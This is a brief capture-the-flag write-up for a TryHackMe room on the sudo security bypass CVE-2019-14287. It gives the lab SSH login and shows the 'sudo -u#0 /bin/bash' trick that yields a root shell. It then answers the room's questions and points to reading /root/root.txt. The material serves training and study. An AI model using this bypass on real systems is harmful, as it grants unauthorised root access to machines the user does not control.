# Tryhackme - Sudo Security Bypass - Linux

- Let's ssh to the machine `ssh -p 2222 tryhackme@10.10.114.224` password is `tryhackme`
- `sudo -l` sends back to us the requirement to exploit `CVE-2019-14287`
![image](https://user-images.githubusercontent.com/96747355/167304720-227d9005-e637-45bf-94d0-d2b9d90aa4b0.png)  
- Following the example shown we could try to use this trick `sudo -u#0 <command>` and put /bin/bash as the command and it works!  
![image](https://user-images.githubusercontent.com/96747355/167304813-e079cfc6-15db-4235-8d77-ccaa6133d07e.png)  

## Questions

- `What command are you allowed to run with sudo?` Answer `/bin/bash`
- `What is the flag in /root/root.txt?` I will let you answer this on your own you will need to `cat /root/root.txt`
